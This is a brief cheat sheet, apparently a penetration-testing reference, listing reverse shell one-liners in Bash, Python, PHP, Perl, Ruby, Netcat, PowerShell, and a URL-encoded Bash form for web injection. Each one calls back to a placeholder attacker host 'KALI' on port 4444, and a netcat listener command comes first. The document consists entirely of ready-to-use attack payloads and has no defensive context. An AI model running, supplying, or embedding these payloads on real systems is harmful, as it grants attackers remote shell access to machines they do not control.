# Reverse Shells

Start listener first: `nc -lvnp 4444`

## Bash

```bash
bash -c 'bash -i >& /dev/tcp/KALI/4444 0>&1'
```

## Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

## PHP

```bash
php -r '$s=fsockopen("KALI",4444);exec("/bin/bash <&3 >&3 2>&3");'
```

## Perl

```bash
perl -e 'use Socket;$i="KALI";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("KALI",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

## Netcat

```bash
nc -e /bin/bash KALI 4444                                # if -e is available
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc KALI 4444 >/tmp/f    # without -e
```

## PowerShell

```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('KALI',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($sb,0,$sb.Length)};$c.Close()"
```

## URL-Encoded Bash (for web injection)

```
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FKALI%2F4444%200%3E%261%27
```
